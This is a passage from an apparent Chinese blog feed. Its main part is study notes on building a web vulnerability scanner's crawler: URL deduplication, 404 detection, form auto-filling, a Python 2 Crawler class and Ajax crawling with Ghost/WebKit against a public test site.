就会调用函数<code>handle_a_tag_end(tag)</code>, 因此，可以重载这些处理函数来完成URL提取，部分核心代码如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F35.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F36.png" alt="此处输入图片的描述"></p><h4 id="3-自动填表"><a href="#3-自动填表" class="headerlink" title="(3)自动填表"></a><strong>(3)自动填表</strong></h4><p>为了实现自动填写表单的功能， <strong>需要建立常见表单字段与内容的对应关系</strong>，并<strong>生成表单知识库</strong>。<strong>如果表单字段存在于该知识库中，那么就可以用对应的内容进行填充</strong>，从而完成自动填表的功能。 常见的表单字段信息如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F37.png" alt="此处输入图片的描述"></p><p>显然， 如果上述表单<strong>知识库</strong>中的表单字段越多， 那么自动化填写的能力就越强。这里主要是为了讲解原理和实现功能， 就不继续丰富表单知识库了，暂且以现有的这些表单字段来实现自动填表， 部分实现代码如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F38.png" alt="此处输入图片的描述"></p><h3 id="5-URL-去重去似"><a href="#5-URL-去重去似" class="headerlink" title="5.URL 去重去似"></a><strong>5.URL 去重去似</strong></h3><h4 id="1-URL-去重"><a href="#1-URL-去重" class="headerlink" title="(1)URL 去重"></a><strong>(1)URL 去重</strong></h4><p>前面提到过的两种方式：布隆过滤器和 hash表</p><h5 id="1-布隆过滤器-1"><a href="#1-布隆过滤器-1" class="headerlink" title="1.布隆过滤器"></a><strong>1.布隆过滤器</strong></h5><p>这里有两个实现布隆算法的Python模块，可以直接使用它们进行URL去重，如下</p><blockquote><p><strong>Python-bloomfilter</strong> </p><p>Github 地址为 <a href="https://github.com/jaybaird/Python-bloomfilter">https://github.com/jaybaird/Python-bloomfilter</a></p><p><strong>Pybloomfiltermmap</strong></p><p>Github 地址为 <a href="https://github.com/axiak/pybloomfiltermmap">https://github.com/axiak/pybloomfiltermmap</a><br>官方文档为：<a href="https://axiak.github.io/pybloomfiltermmap/">https://axiak.github.io/pybloomfiltermmap/</a></p></blockquote><p><strong>这里我们用 Pybloomfiltermmap 模块进行介绍，</strong></p><p>在Pybloomfiltermmap模块中，实现了两类布隆过滤器： Bloomfilter和ScalableBloomfilter</p><p>其中，Bloomfilter是个定容的过滤器，error_rate是指最大的误报率；ScalableBloomfilter是一个不定容最的布隆过滤器，它可以不断添加元素。方法add是添加元素，如果元素已经在布隆过滤器中，那么返回True;如果不在，那么返回False</p><p><strong>具体实现：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F39.png" alt="此处输入图片的描述"></p><h5 id="2-Hash-表去重"><a href="#2-Hash-表去重" class="headerlink" title="2.Hash 表去重"></a><strong>2.Hash 表去重</strong></h5><p>还可以用Hash表去重，其原理非常简单，通过遍历原URL列表，判断每个URL是否在去重后的列表中，如果不在列表中，那么彻添加到去重后的列表中；如果在列表中，那么直接忽略即可，具体方法如下。</p><h6 id="方法一：利用内存-Hash-表去重"><a href="#方法一：利用内存-Hash-表去重" class="headerlink" title="方法一：利用内存 Hash 表去重"></a><strong>方法一：利用内存 Hash 表去重</strong></h6><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F40.png" alt="此处输入图片的描述"></p><p>在实际的爬行中， URL的长度其实并不固定， 而且随着爬行深度的增加， 单个URL的长 度会越来越长。如果此时仍然使用URL作为Key值进行去重，显然不太合理，这样内存和性能都会损耗过快。此时可以对URL进行Hash运算压缩， 比如：16位的md5运算。 这样就可 以把URL的长度固定为16字节，从而提高去重的效率， 如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F41.png" alt="此处输入图片的描述"><br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F42.png" alt="此处输入图片的描述"></p><h6 id="方法二：利用-BerkeleyDB-去重"><a href="#方法二：利用-BerkeleyDB-去重" class="headerlink" title="方法二：利用 BerkeleyDB 去重"></a><strong>方法二：利用 BerkeleyDB 去重</strong></h6><p>首先， 从Oracle官网(<a href="http://www.oracle.com/technetwork/cn/database/database-technologies/">http://www.oracle.com/technetwork/cn/database/database-technologies/</a> berkeleydb&#x2F;downloads&#x2F;index.html)下载Berkeley DB的源码。</p><p>还需要安装Python的bsddb3模块。 它提供了BerkeleyDB数据库的操作接口，这样就可以在Python中使用该数据库了</p><p><strong>具体实现：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F43.png" alt="此处输入图片的描述"></p><h4 id="2-URL-去似去含"><a href="#2-URL-去似去含" class="headerlink" title="(2)URL 去似去含"></a><strong>(2)URL 去似去含</strong></h4><p><strong>具体实现：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F44.png" alt="此处输入图片的描述"><br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F45.png" alt="此处输入图片的描述"></p><p><strong>测试代码：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F46.png" alt="此处输入图片的描述"></p><h3 id="6-404-页面的识别"><a href="#6-404-页面的识别" class="headerlink" title="6.404 页面的识别"></a><strong>6.404 页面的识别</strong></h3><p>404页面识别并不能简单地靠状态码信息，<strong>首先需要建立404页面知识库，然后从状态码和页面内容两个维度进行准确识别</strong>，这样就可以极大地提高404页面识别的准确度(这里的知识库我理解就是数据对应关系的意思，或者理解为数据库)。</p><p>我们可以通过随机<strong>构造一些明显不存在的网站来触发目标的 404 页面</strong>， 比如：tscrumer_404_nofound.html、no_exists_for_test.html等。在实际的文件名构造中，可以加入随机因子， 避免重名问题，然后将这些页面的特征进行提取和存储，建立对应的404页面知识库。</p><p><strong>具体方法：</strong></p><p>可以通过状态码，以及与现有的 404 页面知识库进行404 页面识别。 具体的识别逻辑为：如果当前页面的状态码为 404, 那么它为 404 页面；如果当前页面的状态码不是 404,那么将该页面与 404 页面知识库中的页面进行内容相似度比较，如果相识度高千阙值，那么判定当前页面为404 页面。 <strong>部分核心代码实现如下</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F47.png" alt="此处输入图片的描述"></p><h3 id="7-断连重试"><a href="#7-断连重试" class="headerlink" title="7.断连重试"></a><strong>7.断连重试</strong></h3><p>在使用 Requests 模块进行网络通信时，如果网络连接不可用或断开，那么该模块会抛出相应的异常，我们可以<strong>通过捕获异常来实现断连重试的功能</strong>。为了对爬虫程序的结构影响最小，这里可以利用Python 中的<strong>装饰器来实现断连重试</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F48.png" alt="此处输入图片的描述"></p><h3 id="8-爬虫实现"><a href="#8-爬虫实现" class="headerlink" title="8.爬虫实现"></a><strong>8.爬虫实现</strong></h3><p>至此，爬虫的基础功能都已实现了，下面就根据爬虫的结构，将这些功能进行整合，实现最终版本的Web爬虫，这里用Crawler类对Web爬虫进行封装实现，部分实现代码和结构如下：</p><pre><code class="hljs"># coding=utf-8&#39;&#39;&#39;crawler.py&#39;&#39;&#39;import sysimport tracebackimport itertoolsimport timefrom Queue import Queuefrom LogManager import log as om# HTTPRequestfrom teye_web.http.URL import URLfrom teye_web.http.Request import Requestfrom teye_web.http.Response import Response# url functionfrom teye_web.http.function import is_similar_url# Document Parserimport teye_web.parser.dpCache as dpCache# wCurlfrom wCurl import wcurl# 404 Checkfrom teye_util.page_404 import is_404class Crawler(object):    def __init__(self, depth_limit=1, time_limit=30, req_limit=100, filter_similar=True):        &#39;&#39;&#39;        &#39;&#39;&#39;        self.root = &#39;&#39;        self._target_domain = &#39;&#39;        self.depth_limit = depth_limit        self.time_limit = time_limit        self.req_limit = req_limit        self._sleeptime = 1        self._url_list = []        self._already_visit_url = set()        self._already_seen_urls = set()        self._already_send_reqs = set()        self._relate_ext = [&#39;html&#39;, &#39;shtm&#39;, &#39;htm&#39;, &#39;shtml&#39;]        self._white_ext = [&#39;asp&#39;, &#39;aspx&#39;, &#39;jsp&#39;, &#39;php&#39;, &#39;do&#39;, &#39;action&#39;]        self._black_ext = [&quot;ico&quot;, &quot;jpg&quot;, &quot;gif&quot;, &quot;js&quot;, &quot;png&quot;, &quot;bmp&quot;, &quot;css&quot;, &quot;zip&quot;, &quot;rar&quot;, &quot;ttf&quot;]        self._blockwords = [&#39;mailto:&#39;, &#39;javascript:&#39;, &#39;file://&#39;, &#39;tel:&#39;]        self.num_urls = 0        self.num_reqs = 0        self._wRequestList = []        self._start_time = None        self._other_domains = set()    def get_discovery_time(self):        &#39;&#39;&#39;        爬虫爬行的时间，单位为：分钟        &#39;&#39;&#39;        now = time.time()        diff = now - self._start_time        return diff / 60    def _do_with_reqs(self, reqs):        &#39;&#39;&#39;        &#39;&#39;&#39;        result = []        count = len(reqs)        if reqs is None or count == 0:            return result        for i in xrange(count):            filter = False            filter_url = reqs[i].get_url()            for j in xrange(count - i - 1):                k = i + j + 1                store_url = reqs[k].get_url()                if is_similar_url(filter_url, store_url):                    filter = True                    break            if not filter:                result.append(reqs[i])        return result    def _get_reqs_from_resp(self, response):        &#39;&#39;&#39;        &#39;&#39;&#39;        new_reqs = []        try:            doc_parser = dpCache.dpc.getDocumentParserFor(response)        except Exception, e:            pass        else:            re_urls, tag_urls = doc_parser.get_get_urls()            form_reqs = doc_parser.get_form_reqs()            seen = set()            for new_url in itertools.chain(re_urls, tag_urls):                if new_url in seen:                    continue                seen.add(new_url)                if new_url.get_host() != self._target_domain:                    if new_url.get_host() not in self._other_domains:                        self._other_domains.add(new_url.get_host())                    continue                if new_url not in self._url_list:                    self._url_list.append(new_url)                    wreq = self._url_to_req(new_url, response)                    if wreq not in self._wRequestList:                        new_reqs.append(wreq)                        self._wRequestList.append(wreq)            for item in form_reqs:                if item not in self._wRequestList:                    new_reqs.append(item)                    self._wRequestList.append(item)            return new_reqs    def _url_to_req(self, new_url, response, method=&quot;GET&quot;):        &#39;&#39;&#39;        &#39;&#39;&#39;        req = Request(new_url)        req.set_method(method)        new_referer = response.get_url()        req.set_referer(new_referer)        new_cookies = response.get_cookies()        req.set_cookies(new_cookies)        return req    def crawl(self, root_url):        &#39;&#39;&#39;        将URL对象存入到队列        &#39;&#39;&#39;        if not isinstance(root_url, URL):            root_url_obj = URL(root_url)        else:            root_url_obj = root_url        self._target_domain = root_url_obj.get_host()        self._url_list.append(root_url_obj)        root_req = Request(root_url_obj)        q = Queue()        q.put((root_req, 0))        self._start_time = time.time()        while True:            if q.empty():                print &quot;reqs empty break&quot;                break            this_req, depth = q.get()            # 将静态链接进行过滤            if this_req.get_url().get_ext() in self._black_ext:                continue            # 控制爬行的深度            if depth &gt; self.depth_limit:                print &quot;depth limit break&quot;                break            # 控制爬行的时间            if self.get_discovery_time() &gt; self.time_limit:                print &quot;time limit break&quot;                break            # 控制爬行的链接数，避免内存泄露            if self.num_reqs &gt; self.req_limit:                print &quot;reqs num limit break&quot;                break            if this_req in self._already_send_reqs:                continue            try:                self._already_send_reqs.add(this_req)                om.info(&quot;%s Request:%s&quot; % (this_req.get_method(), this_req.get_url().url_string))                response = None                try:                    response = wcurl._send_req(this_req)                except Exception, e:                    print str(e)                    pass                if is_404(response):                    continue                if response is None:                    continue                # 获取HTTP响应中的请求                new_reqs = self._get_reqs_from_resp(response)                # 过滤相似和包含的请求                filter_reqs = self._do_with_reqs(new_reqs)                depth = depth + 1                for req in filter_reqs:                    q.put((req, depth))                self.num_reqs = len(self._already_send_reqs)                om.info(&quot;Already Send Reqs:&quot; + str(self.num_reqs) + &quot; Left Reqs:&quot; + str(q.qsize()))            except  Exception, e:                traceback.print_exc()                om.info(&quot;ERROR: Can&#39;t process url &#39;%s&#39; (%s)&quot; % (this_req.get_url(), e))                continue            time.sleep(self._sleeptime)        return self._do_with_reqs(self._wRequestList)if __name__ == &quot;__main__&quot;:    &#39;&#39;&#39;    &#39;&#39;&#39;    # url1=&quot;http://testphp.vulnweb.com/showimage.php&quot;    # url2=&quot;http://testphp.vulnweb.com/showimage.php?id=1&quot;    # print is_similar_url(url1,url2)    # sys.exit()    w = Crawler()    wurl = &quot;http://192.168.1.105:8080/wavsep/active/index-sql.jsp&quot;    a = w.crawl(wurl)    for item in a:        # print &quot;\r\n&quot;        # print item        print item.get_url()    print &quot;Found URL Num:&quot; + str(len(a))    sys.exit()</code></pre><h3 id="9-web-2-0-爬虫-重中之重"><a href="#9-web-2-0-爬虫-重中之重" class="headerlink" title="9.web 2.0 爬虫(重中之重)"></a><strong>9.web 2.0 爬虫(重中之重)</strong></h3><h4 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="(1)基本概念"></a><strong>(1)基本概念</strong></h4><p>在Web 1.0时代，网站主要是基千静态页面来构建的，以单向内容输出为主。到了Web2.0时代， 随着动态脚本的兴起和Ajax技术的发展(Ajax全称为”Asynchronous JavascriptAndXML”,异步JavaScript和XML, 它是一种创建交互式应用的网页开发技术）， Web站点的架构和交互场景也发生了变化，网站中融入了更多的动态交互和事件触发， 这也给传统的Web爬虫提出了新的挑战，因为通过正则匹配的爬取方式显然已经力不从心，它们无法爬取到Web 2.0中的异步请求和事件请求。<strong>在传统Web爬虫的视角里， 每一个URL代表了站点中的一个页面，新页面的URL是可以很容易地通过正则匹配爬取的</strong>。但在Ajax应用中， 这种情况则发生了改变，<strong>一个页面中会有不同的状态，每个状态代表着不同的页面</strong>，因此这些状态也需要被爬取到。<strong>由于状态之间的跳转是通过交互的方式进行触发的， 而传统爬虫并不具备交互的能力，所以它无法进行感知和爬取。</strong></p><p>在了解Web2.0爬虫产生的背景后，我们还需要清楚Ajax的工作方式和特点，其实Ajax不是种新的编程语言，而是 种用千创建更好、 更快， 以及交互性更强的Web应用程序的技术。 它使用 JavaScript向服务器提出请求， 并处理响应而不阻塞用户， 核心对象为 XMLHTTPRequest。通过这个对象，JavaScript可在不重载页面的情况下与Web服务器交换数据， </p><p><strong>工作原理如下：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F49.png" alt="此处输入图片的描述"></p><p>通俗来讲，Ajax就是一种异步通信请求方式，它允许页面内容可以动态地触发和加载，<strong>所以我们在浏览器中看到的页面其实是不完整的，它只能算是完整页面中的一个状态，</strong> 只有<strong>遍历当前页面中所有的状态后， 才能完整地获取当前页面中所有的URL。</strong></p><h4 id="2-要解决的问题"><a href="#2-要解决的问题" class="headerlink" title="(2)要解决的问题"></a><strong>(2)要解决的问题</strong></h4><p>从上面的内容可以得出： 与传统爬虫相比， Web 2.0爬虫的核心在于<strong>页面事件的触发和页面状态的保持</strong>，但要想满足这两个条件， 则需要解决以下<strong>5个主要问题：</strong></p><h5 id="1-执行JavaScript代码"><a href="#1-执行JavaScript代码" class="headerlink" title="1.执行JavaScript代码"></a><strong>1.执行JavaScript代码</strong></h5><p>由于Ajax应用的功能实现依赖于JavaScript代码在Web客户端的执行， <strong>因此Ajax爬虫必须能够执行JavaScript代码</strong>， 所以需要添加一个JavaScript脚本解释器。</p><h5 id="2-页面DOM树操作"><a href="#2-页面DOM树操作" class="headerlink" title="2.页面DOM树操作"></a><strong>2.页面DOM树操作</strong></h5><p>对页面内容进行DOM树解析， 可以对标签进行动态的操作。</p><h5 id="3-页面事件触发"><a href="#3-页面事件触发" class="headerlink" title="3.页面事件触发"></a><strong>3.页面事件触发</strong></h5><p>由于一些标签包含事件属性， <strong>需要对这些事件触发完成交互， 才能获取新的页面</strong>。 </p><h5 id="4-页面状态保持"><a href="#4-页面状态保持" class="headerlink" title="4.页面状态保持"></a><strong>4.页面状态保持</strong></h5><p>传统的Web站点中每一个URL标志着一个静态页面， <strong>而在Ajax应用中， 一个页面有很多状态的变化， 每当触发一个事件， 都会导致页面发生变化</strong>， 所以Web2.0<strong>爬虫需要记录这些页面状态，以便对变化的页面进行URL提取。</strong></p><h5 id="5-重复事件识别"><a href="#5-重复事件识别" class="headerlink" title="5.重复事件识别"></a><strong>5.重复事件识别</strong></h5><p>Ajax应用中<strong>某些事件可能由同一个JavaScript函数来处理</strong>，触发这些事件可能导致相同状态，而这些重复的事件触发会给服务器带来不必要的负载，所以当同一页面在进行状态变化时，需要记录和识别这些重复事件，避免重复触发和爬取。</p><p>说了那么多枯燥的理论，下面我们就来看一下如何实现Ajax爬虫。为了降低技术难度**，可以使用浏览器引擎来实现(在小型的爬虫中可以选择使用 python 的 Ghost 对 webkit 的封装这种技术，但是这种技术只能说是一种玩具类型的，不能适用于大型项目，这本是这里使用的是 ghost 技术，但是我更推荐使用 headless chrome)**，也许会有读者问，为什么不直接使用JavaScript引擎来处理呢？主要是因为单纯的JavaScript引擎虽然可以执行JS代码，但它无法与DOM树关联起来，也无法有效地对DOM树进行操作。而在浏览器引擎的环境下，JavaScript引擎与DOM树有上下文环境，JS代码可以直接对DOM树进行操作， 所以它可以很好地解决 “执行JavaScript代码” 和 “面DOM树操作” 两个难题，让我们可以更加专注千解决Ajax爬虫的核心问题。</p><blockquote><p><strong>概念：</strong> <strong>页面状态深度</strong><br>页面状态深度就是对当前页面进行事件触发时，<strong>页面新产生的内容中仍然存在需要触发的事件</strong>，我们把<strong>每次的事件触发称之为一个深度</strong>。</p></blockquote><p>下面是AWVS (Acunetix Web Vulnerability Scanner)提供的Web2.0<a href="http://testphp.vulnweb.com/AJAX/index.php">测试页面</a>，由于它具有代表性，所以这里用它进行说明。我们来看一下， 当单击其中一个链接时， “artists”前后的变化。</p><p><strong>单击链接前的页面， 如下图：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F52.png" alt="此处输入图片的描述"></p><p><strong>单击链接后的页面， 如下图：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F53.png" alt="此处输入图片的描述"></p><p>可以看到，单击后页面在id为contentDiv的层中新增了内容，而这些新增的内容同样需要进行事件触发才能获取后续的URL, 每一次事件的触发称之为一个深度，当前这个测试页面的状态深度为2, 也就是说，它需要两次事件触发才能完整地获取页面的所有URL。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F54.png" alt="此处输入图片的描述"></p><p>下面我们先来梳理一下 Web2.0爬虫的工作流程， 这里用伪代码来说明， 并将页面的状态深度设置为2,实现伪代码如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F55.png" alt="此处输入图片的描述"></p><blockquote><p>由于篇幅原因，这里先按照书本上的 ghost 这种原始的不优雅的技术内容进行介绍(当然从这种技术上也能看出爬虫编写的基本思想，也是很不错的)，对于 headless chrome 我后面再单独写文章介绍吧(又是给自己留坑了……)。</p></blockquote><p>有了上面的伪代码后， 现在开始进行具体的实现， 这里仍然以AWVS提供的Ajax测试站点(<a href="http://testphp.vulnweb.com/Ajax/index.php)%E4%B8%BA%E7%9B%AE%E6%A0%87%E3%80%82">http://testphp.vulnweb.com/Ajax/index.php)为目标。</a></p><p>首先通过Python的Ghost模块引入浏览器引擎，并利用Ghost对象的Open函数打开目标站点，通过下面三行代码即可实现， 如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F56.png" alt="此处输入图片的描述"></p><p>运行效果如下图：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F56.png" alt="此处输入图片的描述"></p><p>其实Ghost 模块是对WebKit 浏览器引擎的封装，在页面载入的过程中， 它实际上已经完成了DOM 树解析、JS 解析，以及CSS 渲染等一系列工作，这样我们才能看到上图中网页的页面。<strong>但是在这里，我们更关心的是HTTP 请求</strong>。通过查阅PyQt 和Ghost 的官方文档，我们知道，<strong>res对象中存储的内容就是当前页面所发起的网络请求信息，</strong> 这时可以将当前请求的URL打印出来，如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F58.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F59.png" alt="此处输入图片的描述"></p><p>这样每个页面不需要事件触发，主动发起的异步请求信息就可以通过res 对象来获取， 通过其属性值即可获取对应的URL。接下来看一下<strong>如何获取需要交互的URL</strong>。我们先看一下测试站点的网页源代码，页面中存在哪些需要交互的事件， 如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F60.png" alt="此处输入图片的描述"></p><p>从上面方框中的内容可以看到，事件交互的操作主要体现在a标签中。 当单击a标签后，它就会触发对应的JavaScript函数执行， 当函数执行后，页面的内容就会发生变化，这时就可以获取新的URL。 因此，<strong>在这里可以通过模拟单击对应的a标签，然后通过res对象获取异步请求的URL信息</strong>，并通过更新后的页面内容获取新的事件交互链接，如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F61.png" alt="此处输入图片的描述"></p><p>这样就可以完整地获取单击后发送的异步请求和页面更新后的新页面内容，从而成功地完成一次交互爬取。有了这个成功的经验，接下来就进一步考虑如何对页面进行完整的动态爬取。测试页面中有很多的链接，而且每次单击后页面的内容都会发生变化，显然它并不像单次爬取那么容易，下面就一起来整理一下<strong>完整的爬行思路如下：</strong></p><p>(I)在当前页面HO中，遍历所有的a标签对象，对其进行循环事件触发（如：鼠标单击）。<br>(2)事件触发后，获取浏览器对外新发送的HTTP请求，并记录对应的URL。 同时获取当前的页面内容，记为H1. 并利用正则匹配出页面的URL。<br>(3)在第一次单击后形成的页面H1中， 再次遍历新的a标签， 对其进行循环事件触发。<br>(4)第二次事件触发后，同样获取浏览器对外新发送的HTTP请求， 并记录URL列表。获取当前的页面内容， 记为H1. 并利用正则匹配出页面的URL。</p><p>但这里是有问题的， 细心的读者也许会发现，当我们在第二次遍历新的a标签时，由千无法提前知道a标签的其他唯一属性，如：id、name等，所以只能通过getElementsByTag方法获取存放a标签对象的数组，并通过数组的下标来唯一标识， 伪代码如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F62.png" alt="此处输入图片的描述"></p><p>而每次进行事件触发后，页面的内容是会发生变化的，这时页面中就会有新的a标签产生，它会导致使用 getElementsByTag(“a”) 的方式所获取到的 a 标签数组不一样， 因此不能使用<br>getElementsByTag(“a”)[i]来唯一标识特定的a标签对象。</p><p><strong>那么， 如何进行改进呢？</strong></p><p>这里主要是由于<strong>页面内容更新后无法对a标签进行唯一标识导致的</strong>， 因此，可以为<strong>每个页面的a标签增加一个唯一标识的属性</strong>。当页面发生变化时，就可以通过对新页面的a标签与变化前页面的a标签进行比较，计算得出新增的a标签，然后再<strong>单独对新增的a标签进行遍历操作</strong>，这样就不会使a标签数组紊乱了。<strong>可以使用a标签的href和onclick两个属性值来构造Hash作为唯一的标识。</strong></p><p>我们需要在页面解析的代码中，增加对a标签的处理，为其增加唯一的识别标识， 如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F63.png" alt="此处输入图片的描述"></p><p>增加唯一标识后， 再来看看核心部分的完整代码， 如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F64.png" alt="此处输入图片的描述"><br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F65.png" alt="此处输入图片的描述"></p><p>下面还需要扩展单击事件触发的操作，可以在Ghost的客户端脚本工具文件utils.js中增加 下列代码：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F66.png" alt="此处输入图片的描述"></p>]]></content>
    
    
    <categories>
      
      <category>备忘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>备忘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>面向源代码的软件漏洞静态检测综述</title>
    <link href="/2019/03/02/%E9%9D%A2%E5%90%91%E6%BA%90%E4%BB%A3%E7%A0%81%E7%9A%84%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E9%9D%99%E6%80%81%E6%A3%80%E6%B5%8B%E7%BB%BC%E8%BF%B0/"/>
    <url>/2019/03/02/%E9%9D%A2%E5%90%91%E6%BA%90%E4%BB%A3%E7%A0%81%E7%9A%84%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E9%9D%99%E6%80%81%E6%A3%80%E6%B5%8B%E7%BB%BC%E8%BF%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>无意间在看到信息安全学报的一片最新的论文，和我最近看的有点关系，感觉还不错，就放到这里来</p><p>PS:师傅们如果喜欢这个 PDF 请尽量不要直接从我这里下载,因为走的是下行流量需要我每天付费_(:3 」∠ )_,我提供原始下载链接叭！<br><a href="http://www.infocomm-journal.com/cjnis/CN/article/downloadArticleFile.do?attachType=PDF&id=168198">http://www.infocomm-journal.com/cjnis/CN/article/downloadArticleFile.do?attachType=PDF&amp;id=168198</a></p><span id="more"></span><div align="center"><embed width="800" height="800" src="https://pdf-1253331270.cos.ap-beijing.myqcloud.com/%E9%9D%A2%E5%90%91%E6%BA%90%E4%BB%A3%E7%A0%81%E7%9A%84%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E9%9D%99%E6%80%81%E6%A3%80%E6%B5%8B%E7%BB%BC%E8%BF%B0.pdf"> </embed> </div>]]></content>
    
    
    <categories>
      
      <category>论文</category>
      
    </categories>
    
    
    <tags>
      
      <tag>静态检测</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>简单理解污点分析技术</title>
    <link href="/2019/03/01/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/"/>
    <url>/2019/03/01/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/</url>
    
